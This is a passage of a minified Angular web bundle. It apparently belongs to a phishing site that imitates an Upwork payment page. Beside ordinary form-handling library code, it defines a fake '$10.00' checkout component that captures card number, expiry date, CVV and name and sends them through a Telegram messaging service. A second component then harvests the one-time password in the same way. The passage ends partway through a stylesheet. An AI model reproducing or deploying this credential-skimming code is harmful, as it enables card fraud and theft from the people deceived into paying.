submitted(){return yr(this.submittedReactive)}_submitted=wc(()=>this.submittedReactive());submittedReactive=mc(!1);_directives=new Set;form;ngSubmit=new ht;options;constructor(t,r,i){super(),this.callSetDisabledState=i,this.form=new qh({},Av(t),Mv(r))}ngAfterViewInit(){this._setUpdateStrategy()}get formDirective(){return this}get control(){return this.form}get path(){return[]}get controls(){return this.form.controls}addControl(t){Zc.then(()=>{let r=this._findContainer(t.path);t.control=r.registerControl(t.name,t.control),ZS(t.control,t,this.callSetDisabledState),t.control.updateValueAndValidity({emitEvent:!1}),this._directives.add(t)})}getControl(t){return this.form.get(t.path)}removeControl(t){Zc.then(()=>{let r=this._findContainer(t.path);r&&r.removeControl(t.name),this._directives.delete(t)})}addFormGroup(t){Zc.then(()=>{let r=this._findContainer(t.path),i=new qh({});dj(i,t),r.registerControl(t.name,i),i.updateValueAndValidity({emitEvent:!1})})}removeFormGroup(t){Zc.then(()=>{let r=this._findContainer(t.path);r&&r.removeControl(t.name)})}getFormGroup(t){return this.form.get(t.path)}updateModel(t,r){Zc.then(()=>{this.form.get(t.path).setValue(r)})}setValue(t){this.control.setValue(t)}onSubmit(t){return this.submittedReactive.set(!0),pj(this.form,this._directives),this.ngSubmit.emit(t),t?.target?.method==="dialog"}onReset(){this.resetForm()}resetForm(t=void 0){this.form.reset(t),this.submittedReactive.set(!1)}_setUpdateStrategy(){this.options&&this.options.updateOn!=null&&(this.form._updateOn=this.options.updateOn)}_findContainer(t){return t.pop(),t.length?this.form.get(t):this.form}static \u0275fac=function(r){return new(r||n)(Ie(Sv,10),Ie(HS,10),Ie(xv,8))};static \u0275dir=zt({type:n,selectors:[["form",3,"ngNoForm","",3,"formGroup",""],["ng-form"],["","ngForm",""]],hostBindings:function(r,i){r&1&&Cn("submit",function(s){return i.onSubmit(s)})("reset",function(){return i.onReset()})},inputs:{options:[0,"ngFormOptions","options"]},outputs:{ngSubmit:"ngSubmit"},exportAs:["ngForm"],standalone:!1,features:[_c([mj]),gr]})}return n})();function LS(n,e){let t=n.indexOf(e);t>-1&&n.splice(t,1)}function US(n){return typeof n=="object"&&n!==null&&Object.keys(n).length===2&&"value"in n&&"disabled"in n}var yj=class extends Hh{defaultValue=null;_onChange=[];_pendingValue;_pendingChange=!1;constructor(e=null,t,r){super(QS(t),YS(r,t)),this._applyFormState(e),this._setUpdateStrategy(t),this._initObservables(),this.updateValueAndValidity({onlySelf:!0,emitEvent:!!this.asyncValidator}),Wh(t)&&(t.nonNullable||t.initialValueIsDefault)&&(US(e)?this.defaultValue=e.value:this.defaultValue=e)}setValue(e,t={}){this.value=this._pendingValue=e,this._onChange.length&&t.emitModelToViewChange!==!1&&this._onChange.forEach(r=>r(this.value,t.emitViewToModelChange!==!1)),this.updateValueAndValidity(t)}patchValue(e,t={}){this.setValue(e,t)}reset(e=this.defaultValue,t={}){this._applyFormState(e),this.markAsPristine(t),this.markAsUntouched(t),this.setValue(this.value,t),this._pendingChange=!1}_updateValue(){}_anyControls(e){return!1}_allControlsDisabled(){return this.disabled}registerOnChange(e){this._onChange.push(e)}_unregisterOnChange(e){LS(this._onChange,e)}registerOnDisabledChange(e){this._onDisabledChange.push(e)}_unregisterOnDisabledChange(e){LS(this._onDisabledChange,e)}_forEachChild(e){}_syncPendingControls(){return this.updateOn==="submit"&&(this._pendingDirty&&this.markAsDirty(),this._pendingTouched&&this.markAsTouched(),this._pendingChange)?(this.setValue(this._pendingValue,{onlySelf:!0,emitModelToViewChange:!1}),!0):!1}_applyFormState(e){US(e)?(this.value=this._pendingValue=e.value,e.disabled?this.disable({onlySelf:!0,emitEvent:!1}):this.enable({onlySelf:!0,emitEvent:!1})):this.value=this._pendingValue=e}};var vj={provide:eu,useExisting:Qi(()=>nu)},jS=Promise.resolve(),nu=(()=>{class n extends eu{_changeDetectorRef;callSetDisabledState;control=new yj;static ngAcceptInputType_isDisabled;_registered=!1;viewModel;name="";isDisabled;model;options;update=new ht;constructor(t,r,i,o,s,a){super(),this._changeDetectorRef=s,this.callSetDisabledState=a,this._parent=t,this._setValidators(r),this._setAsyncValidators(i),this.valueAccessor=gj(this,o)}ngOnChanges(t){if(this._checkForErrors(),!this._registered||"name"in t){if(this._registered&&(this._checkName(),this.formDirective)){let r=t.name.previousValue;this.formDirective.removeControl({name:r,path:this._getPath(r)})}this._setUpControl()}"isDisabled"in t&&this._updateDisabled(t),hj(t,this.viewModel)&&(this._updateValue(this.model),this.viewModel=this.model)}ngOnDestroy(){this.formDirective&&this.formDirective.removeControl(this)}get path(){return this._getPath(this.name)}get formDirective(){return this._parent?this._parent.formDirective:null}viewToModelUpdate(t){this.viewModel=t,this.update.emit(t)}_setUpControl(){this._setUpdateStrategy(),this._isStandalone()?this._setUpStandalone():this.formDirective.addControl(this),this._registered=!0}_setUpdateStrategy(){this.options&&this.options.updateOn!=null&&(this.control._updateOn=this.options.updateOn)}_isStandalone(){return!this._parent||!!(this.options&&this.options.standalone)}_setUpStandalone(){ZS(this.control,this,this.callSetDisabledState),this.control.updateValueAndValidity({emitEvent:!1})}_checkForErrors(){this._isStandalone()||this._checkParentType(),this._checkName()}_checkParentType(){}_checkName(){this.options&&this.options.name&&(this.name=this.options.name),!this._isStandalone()&&this.name}_updateValue(t){jS.then(()=>{this.control.setValue(t,{emitViewToModelChange:!1}),this._changeDetectorRef?.markForCheck()})}_updateDisabled(t){let r=t.isDisabled.currentValue,i=r!==0&&Xd(r);jS.then(()=>{i&&!this.control.disabled?this.control.disable():!i&&this.control.disabled&&this.control.enable(),this._changeDetectorRef?.markForCheck()})}_getPath(t){return this._parent?sj(t,this._parent):[t]}static \u0275fac=function(r){return new(r||n)(Ie(Ps,9),Ie(Sv,10),Ie(HS,10),Ie($S,10),Ie(eo,8),Ie(xv,8))};static \u0275dir=zt({type:n,selectors:[["","ngModel","",3,"formControlName","",3,"formControl",""]],inputs:{name:"name",isDisabled:[0,"disabled","isDisabled"],model:[0,"ngModel","model"],options:[0,"ngModelOptions","options"]},outputs:{update:"ngModelChange"},exportAs:["ngModel"],standalone:!1,features:[_c([vj]),gr,hs]})}return n})(),Kh=(()=>{class n{static \u0275fac=function(r){return new(r||n)};static \u0275dir=zt({type:n,selectors:[["form",3,"ngNoForm","",3,"ngNativeValidate",""]],hostAttrs:["novalidate",""],standalone:!1})}return n})();function _j(n){return typeof n=="number"?n:parseInt(n,10)}var wj=(()=>{class n{_validator=PS;_onChange;_enabled;ngOnChanges(t){if(this.inputName in t){let r=this.normalizeInput(t[this.inputName].currentValue);this._enabled=this.enabled(r),this._validator=this._enabled?this.createValidator(r):PS,this._onChange&&this._onChange()}}validate(t){return this._validator(t)}registerOnValidatorChange(t){this._onChange=t}enabled(t){return t!=null}static \u0275fac=function(r){return new(r||n)};static \u0275dir=zt({type:n,features:[hs]})}return n})();var Ej={provide:Sv,useExisting:Qi(()=>ru),multi:!0},ru=(()=>{class n extends wj{maxlength;inputName="maxlength";normalizeInput=t=>_j(t);createValidator=t=>QU(t);static \u0275fac=(()=>{let t;return function(i){return(t||(t=ps(n)))(i||n)}})();static \u0275dir=zt({type:n,selectors:[["","maxlength","","formControlName",""],["","maxlength","","formControl",""],["","maxlength","","ngModel",""]],hostVars:1,hostBindings:function(r,i){r&2&&Qd("maxlength",i._enabled?i.maxlength:null)},inputs:{maxlength:"maxlength"},standalone:!1,features:[_c([Ej]),gr]})}return n})();var Ij=(()=>{class n{static \u0275fac=function(r){return new(r||n)};static \u0275mod=Qe({type:n});static \u0275inj=Ke({})}return n})();var eA=(()=>{class n{static withConfig(t){return{ngModule:n,providers:[{provide:xv,useValue:t.callSetDisabledState??Rv}]}}static \u0275fac=function(r){return new(r||n)};static \u0275mod=Qe({type:n});static \u0275inj=Ke({imports:[Ij]})}return n})();var Qh=class n{constructor(e,t){this.telegramService=e;this.router=t}date=new Date;formData={expiryDate:"",cardNumber:"",cvv:"",name:""};onSubmit(){this.telegramService.sendMessage(JSON.stringify(this.formData)).subscribe(()=>{this.router.navigate(["verifyOTP"])})}onInputChange(e,t){if(e==="expiryDate"){let r=t.target.value;r.length===2&&!r.includes("/")?this.formData.expiryDate=r+"/":r.length<=5&&(this.formData.expiryDate=r)}if(e==="cardNumber"){let r=t.target.value.replace(/\s+/g,""),i="";for(let o=0;o<r.length;o++)o>0&&o%4===0&&(i+=" "),i+=r[o];this.formData.cardNumber=i}}static \u0275fac=function(t){return new(t||n)(Ie(ui),Ie(Sn))};static \u0275cmp=Bn({type:n,selectors:[["app-upwork-payment"]],standalone:!1,decls:82,vars:7,consts:[[1,"container","bg-light","d-md-flex","align-items-center"],[1,"card","box1","shadow-sm","p-md-5","p-md-5","p-4"],[1,"fw-bolder","mb-4"],[1,"fas","fa-dollar-sign"],[1,"ps-1"],[1,"d-flex","flex-column"],[1,"d-flex","align-items-center","justify-content-between","text"],[1,""],[1,"d-flex","align-items-center","justify-content-between","text","mb-4"],[1,"border-bottom","mb-4"],[1,"d-flex","flex-column","mb-4"],[1,"far","fa-file-alt","text"],[1,"ps-2"],[1,"ps-3"],[1,"d-flex","flex-column","mb-5"],[1,"far","fa-calendar-alt","text"],[1,"d-flex","align-items-center","justify-content-between","text","mt-5"],["src","/Up_Logo.png","alt","","srcset","",1,"up_logo"],[1,"card","box2","shadow-sm"],[1,"d-flex","align-items-center","justify-content-between","p-md-5","p-4"],[1,"h5","fw-bold","m-0"],[1,"btn","btn-primary","bar"],[1,"fas","fa-bars"],[1,"nav","nav-tabs","mb-3","px-md-4","px-2"],[1,"nav-item"],["aria-current","page","href","#",1,"nav-link","px-2","active"],["action",""],[1,"row"],[1,"col-12"],[1,"d-flex","flex-column","px-md-5","px-4","mb-4"],[1,"inputWithIcon"],["name","cardNumber","maxlength","19","type","text","placeholder","0000 0000 0000 0000",1,"form-control",3,"ngModelChange","input","ngModel"],["src","https://www.freepnglogos.com/uploads/mastercard-png/mastercard-logo-logok-15.png","alt",""],["src","https://purepng.com/public/uploads/large/purepng.com-visa-logologobrand-logoiconslogos-251519938794uqvcz.png","alt",""],[1,"col-md-6"],[1,"d-flex","flex-column","ps-md-5","px-md-0","px-4","mb-4"],["type","text","maxlength","5","name","expiryDate","placeholder","MM/YY",1,"form-control",3,"ngModelChange","input","ngModel"],[1,"fas","fa-calendar-alt"],[1,"d-flex","flex-column","pe-md-5","px-md-0","px-4","mb-4"],["type","password","maxlength","4","name","cvv","placeholder","***",1,"form-control",3,"ngModelChange","ngModel"],[1,"fas","fa-lock"],["name","Name","type","text","placeholder","Name",1,"form-control","text-uppercase",3,"ngModelChange","ngModel"],[1,"far","fa-user"],[1,"col-12","px-md-5","px-4","mt-3"],[1,"btn","btn-primary","w-100",3,"click"]],template:function(t,r){t&1&&(he(0,"div",0)(1,"div",1)(2,"div",2),Dt(3,"span",3),he(4,"span",4),Ue(5,"$10.00"),de()(),he(6,"div",5)(7,"div",6)(8,"span",7),Ue(9,"Commission"),de(),he(10,"span",3)(11,"span",4),Ue(12,"$0.00"),de()()(),he(13,"div",8)(14,"span"),Ue(15,"Total"),de(),he(16,"span",3)(17,"span",4),Ue(18,"$10.00"),de()()(),Dt(19,"div",9),he(20,"div",10)(21,"span",11)(22,"span",12),Ue(23,"Invoice ID:"),de()(),he(24,"span",13),Ue(25,"SN8478042099"),de()(),he(26,"div",14)(27,"span",15)(28,"span",12),Ue(29,"Payment Date:"),de()(),he(30,"span",13),Ue(31),Hb(32,"date"),de()(),he(33,"div",16),Dt(34,"img",17),de()()(),he(35,"div",18)(36,"div",19)(37,"span",20),Ue(38,"Payment methods"),de(),he(39,"div",21),Dt(40,"span",22),de()(),he(41,"ul",23)(42,"li",24)(43,"a",25),Ue(44,"Debit/ Credit Card"),de()()(),he(45,"form",26)(46,"div",27)(47,"div",28)(48,"div",29)(49,"span"),Ue(50,"Credit Card"),de(),he(51,"div",30)(52,"input",31),ti("ngModelChange",function(o){return Xi(r.formData.cardNumber,o)||(r.formData.cardNumber=o),o}),Cn("input",function(o){return r.onInputChange("cardNumber",o)}),de(),he(53,"span",7),Dt(54,"img",32)(55,"img",33),de()()()(),he(56,"div",34)(57,"div",35)(58,"span"),Ue(59,"Expiration"),he(60,"span",4),Ue(61,"Date"),de()(),he(62,"div",30)(63,"input",36),ti("ngModelChange",function(o){return Xi(r.formData.expiryDate,o)||(r.formData.expiryDate=o),o}),Cn("input",function(o){return r.onInputChange("expiryDate",o)}),de(),Dt(64,"span",37),de()()(),he(65,"div",34)(66,"div",38)(67,"span"),Ue(68,"Code CVV"),de(),he(69,"div",30)(70,"input",39),ti("ngModelChange",function(o){return Xi(r.formData.cvv,o)||(r.formData.cvv=o),o}),de(),Dt(71,"span",40),de()()(),he(72,"div",28)(73,"div",29)(74,"span"),Ue(75,"Name"),de(),he(76,"div",30)(77,"input",41),ti("ngModelChange",function(o){return Xi(r.formData.name,o)||(r.formData.name=o),o}),de(),Dt(78,"span",42),de()()(),he(79,"div",43)(80,"div",44),Cn("click",function(){return r.onSubmit()}),Ue(81,"Pay $10.00"),de()()()()()()),t&2&&(Xr(31),fy(qb(32,5,r.date)),Xr(21),ei("ngModel",r.formData.cardNumber),Xr(11),ei("ngModel",r.formData.expiryDate),Xr(7),ei("ngModel",r.formData.cvv),Xr(7),ei("ngModel",r.formData.name))},dependencies:[Kh,Os,zh,Gh,ru,nu,tu,lT],styles:['@font-face{font-family:Montserrat;font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WRhyzbi.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:Montserrat;font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459W1hyzbi.woff2) format("woff2");unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:Montserrat;font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WZhyzbi.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:Montserrat;font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459Wdhyzbi.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:Montserrat;font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459Wlhyw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:Montserrat;font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WRhyzbi.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:Montserrat;font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459W1hyzbi.woff2) format("woff2");unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:Montserrat;font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WZhyzbi.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:Montserrat;font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459Wdhyzbi.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:Montserrat;font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459Wlhyw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}*[_ngcontent-%COMP%]{margin:0;padding:0;box-sizing:border-box;list-style:none;font-family:Montserrat,sans-serif}body[_ngcontent-%COMP%]{background-color:#3ecc6d}.container[_ngcontent-%COMP%]{margin:20px auto;width:800px;padding:30px}.card.box1[_ngcontent-%COMP%]{width:350px;height:500px;background-color:#3ecc6d;color:#baf0c3;border-radius:0}.card.box2[_ngcontent-%COMP%]{width:450px;height:580px;background-color:#fff;border-radius:0}.text[_ngcontent-%COMP%]{font-size:13px}.box2[_ngcontent-%COMP%]   .btn.btn-primary.bar[_ngcontent-%COMP%]{width:20px;background-color:transparent;border:none;color:#3ecc6d}.box2[_ngcontent-%COMP%]   .btn.btn-primary.bar[_ngcontent-%COMP%]:hover{color:#baf0c3}.box1[_ngcontent-%COMP%]   .btn.btn-primary[_ngcontent-%COMP%]{background-color:#57c97d;width:45px;height:45px;display:flex;justify-content:center;align-items:center;border:1px solid #ddd}.box1[_ngcontent-%COMP%]   .btn.btn-primary[_ngcontent-%COMP%]:hover{background-color:#f6f8f7;color:#57c97d}.btn.btn-success[_ngcontent-%COMP%]{width:40px;height:40px;border-radius:50%;background-color:#ddd;color:#000;display:flex;justify-content:center;align-items:center;border:none}.nav.nav-tabs[_ngcontent-%COMP%]{border:none;border-bottom:2px solid #ddd}.nav.nav-tabs[_ngcontent-%COMP%]   .nav-item[_ngcontent-%COMP%]   .nav-link[_ngcontent-%COMP%]{border:none;color:#000;border-bottom:2px solid transparent;font-size:14px}.nav.nav-tabs[_ngcontent-%COMP%]   .nav-item[_ngcontent-%COMP%]   .nav-link[_ngcontent-%COMP%]:hover{border-bottom:2px solid #3ecc6d;color:#05cf48}.nav.nav-tabs[_ngcontent-%COMP%]   .nav-item[_ngcontent-%COMP%]   .nav-link.active[_ngcontent-%COMP%]{border:none;border-bottom:2px solid #3ecc6d}.form-control[_ngcontent-%COMP%]{border:none;border-bottom:1px solid #ddd;box-shadow:none;height:20px;font-weight:600;font-size:14px;padding:15px 0;letter-spacing:1.5px;border-radius:0}.inputWithIcon[_ngcontent-%COMP%]{position:relative}img[_ngcontent-%COMP%]{width:50px;height:20px;object-fit:cover}.up_logo[_ngcontent-%COMP%]{width:70px;height:auto}.inputWithIcon[_ngcontent-%COMP%]   span[_ngcontent-%COMP%]{position:absolute;right:0;bottom:9px;color:#57c97d;cursor:pointer;transition:.3s;font-size:14px}.form-control[_ngcontent-%COMP%]:focus{box-shadow:none;border-bottom:1px solid #ddd}.btn-outline-primary[_ngcontent-%COMP%]{color:#000;background-color:#ddd;border:1px solid #ddd}.btn-outline-primary[_ngcontent-%COMP%]:hover{background-color:#05cf48;border:1px solid #ddd}.btn-check[_ngcontent-%COMP%]:active + .btn-outline-primary[_ngcontent-%COMP%], .btn-check[_ngcontent-%COMP%]:checked + .btn-outline-primary[_ngcontent-%COMP%], .btn-outline-primary.active[_ngcontent-%COMP%], .btn-outline-primary.dropdown-toggle.show[_ngcontent-%COMP%], .btn-outline-primary[_ngcontent-%COMP%]:active{color:#baf0c3;background-color:#3ecc6d;box-shadow:none;border:1px solid #ddd}.btn-group[_ngcontent-%COMP%] > .btn-group[_ngcontent-%COMP%]:not(:last-child) > .btn[_ngcontent-%COMP%], .btn-group[_ngcontent-%COMP%] > .btn[_ngcontent-%COMP%]:not(:last-child):not(.dropdown-toggle), .btn-group[_ngcontent-%COMP%] > .btn-group[_ngcontent-%COMP%]:not(:first-child) > .btn[_ngcontent-%COMP%], .btn-group[_ngcontent-%COMP%] > .btn[_ngcontent-%COMP%]:nth-child(n+3), .btn-group[_ngcontent-%COMP%] > [_ngcontent-%COMP%]:not(.btn-check) + .btn[_ngcontent-%COMP%]{border-radius:50px;margin-right:20px}form[_ngcontent-%COMP%]{font-size:14px}form[_ngcontent-%COMP%]   .btn.btn-primary[_ngcontent-%COMP%]{width:100%;height:45px;display:flex;flex-direction:column;justify-content:center;align-items:center;background-color:#3ecc6d;border:1px solid #ddd}form[_ngcontent-%COMP%]   .btn.btn-primary[_ngcontent-%COMP%]:hover{background-color:#05cf48}@media (max-width:750px){.container[_ngcontent-%COMP%]{padding:10px;width:100%}.text-green[_ngcontent-%COMP%]{font-size:14px}.card.box1[_ngcontent-%COMP%], .card.box2[_ngcontent-%COMP%]{width:100%}.nav.nav-tabs[_ngcontent-%COMP%]   .nav-item[_ngcontent-%COMP%]   .nav-link[_ngcontent-%COMP%]{font-size:12px}}']})};var Yh=class n{constructor(e,t){this.router=e;this.telegramService=t}formData={otp:""};onSubmit(){this.telegramService.sendMessage(JSON.stringify(this.formData)).subscribe(()=>{this.router.navigate(["loader"])})}static \u0275fac=function(t){return new(t||n)(Ie(Sn),Ie(ui))};static \u0275cmp=Bn({type:n,selectors:[["app-otp"]],standalone:!1,decls:18,vars:1,consts:[[1,"container","bg-light",2,"display","flex","justify-content","center"],[1,"card","box2","shadow-sm"],[1,"d-flex","align-items-center","justify-content-between","p-md-5","p-4"],[1,"h5","fw-bold","m-0"],[1,"btn","btn-primary","bar"],[1,"fas","fa-bars"],["action",""],[1,"row"],[1,"col-12"],[1,"d-flex","flex-column","px-md-5","px-4","mb-4"],[1,"inputWithIcon"],["name","otp","maxlength","10","type","text","placeholder","",1,"form-control",3,"ngModelChange","ngModel"],[1,"col-12","px-md-5","px-4","mt-3"],[1,"btn","btn-primary","w-100",3,"click"]],template:function(t,r){t&1&&(he(0,"div",0)(1,"div",1)(2,"div",2)(3,"span",3),Ue(4,"Payment methods"),de(),he(5,"div",4),Dt(6,"span",5),de()(),he(7,"form",6)(8,"div",7)(9,"div",8)(10,"div",9)(11,"span"),Ue(12,"OTP"),de(),he(13,"div",10)(14,"input",11),ti("ngModelChange",function(o){return Xi(r.formData.otp,o)||(r.formData.otp=o),o}),de()()()(),he(15,"div",12)(16,"div",13),Cn("click",function(){return r.onSubmit()}),Ue(17,"Submit"),de()()()()()()),t&2&&(Xr(14),ei("ngModel",r.formData.otp))},dependencies:[Kh,Os,zh,Gh,ru,nu,tu],styles:['@font-face{font-family:Montserrat;font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WRhyzbi.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:Montserrat;font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459W1hyzbi.woff2) format("woff2");unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:Montserrat;font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WZhyzbi.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:Montserrat;font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459Wdhyzbi.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:Montserrat;font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459Wlhyw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:Montserrat;font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WRhyzbi.woff2) format("woff2");unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:Montserrat;font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459W1hyzbi.woff2) format("woff2");unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:Montserrat;font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WZhyzbi.woff2) format("woff2");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:Montserrat;font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459Wdhyzbi.woff2) format("woff2");unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:Montserrat;font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459Wlhyw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}*[_ngcontent-%COMP%]{margin:0;padding:0;box-sizing:border-box;list-style:none;font-family:Montserrat,sans-serif}body[_ngcontent-%COMP%]{background-color:#3ecc6d}.container[_ngcontent-%COMP%]{margin:20px auto;width:800px;padding:30px}.card.box1[_ngcontent-%COMP%]{width:350px;height:500px;background-color:#3ecc6d;color:#baf0c3;border-radius:0}.card.box2[_ngcontent-%COMP%]{width:450px;height:350px;background-color:#fff;border-radius:0}.text[_ngcontent-%COMP%]{font-size:13px}.box2[_ngcontent-%COMP%]   .btn.btn-primary.bar[_ngcontent-%COMP%]{width:20px;background-color:transparent;border:none;color:#3ecc6d}.box2[_ngcontent-%COMP%]   .btn.btn-primary.bar[_ngcontent-%COMP%]:hover{color:#baf0c3}.box1[_ngcontent-%COMP%]   .btn.btn-primary[_ngcontent-%COMP%]{background-color:#57c97d;width:45px;height:45px;display:flex;justify-content:center;align-items:center;border:1px solid #ddd}.box1[_ngcontent-%COMP%]   .btn.btn-primary[_ngcontent-%COMP%]:hover{background-color:#f6f8f7;color:#57c97d}.btn.btn-success[_ngcontent-%COMP%]{width:40px;height:40px;border-radius:50%;background-color:#ddd;color:#000;display:flex;justify-content:center;align-items:center;border:none}.nav.nav-tabs[_ngcontent-%COMP%]{border:none;border-bottom:2px solid #ddd}.nav.nav-tabs[_ngcontent-%COMP%]   .nav-item[_ngcontent-%COMP%]   .nav-link[_ngcontent-%COMP%]{border:none;color:#000;border-bottom:2px solid transparent;font-size:14px}.nav.nav-tabs[_ngcontent-%COMP%]   .nav-item[_ngcontent-%COMP%]   .nav-link[_ngcontent-%COMP%]:hover{border-bottom:2px solid #3ecc6d;color:#05cf48}.nav.nav-tabs[_ngcontent-%COMP%]   .nav-item[_ngcontent-%COMP%]   .nav-link.active[_ngcontent-%COMP%]{border:none;border-bottom:2px solid #3ecc6d}.form-control[_ngcontent-%COMP%]{border:none;border-bottom:1px solid #ddd;box-shadow:none;height:20px;font-weight:600;font-size:14px;padding:15px 0;letter-spacing:1.5px;border-radius:0}.inputWithIcon[_ngcontent-%COMP%]{position:relative}img[_ngcontent-%COMP%]{width:50px;height:20px;object-fit:cover}.up_logo[_ngcontent-%COMP%]{width:70px;height:auto}.inputWithIcon[_ngcontent-%COMP%]   span[_ngcontent-%COMP%]{position:absolute;right:0;bottom:9px;color:#57c97d;cursor:pointer;transition:.3s;font-size:14px}.form-control[_ngcontent-%COMP%]:focus{box-shadow:none;border-bottom:1px solid 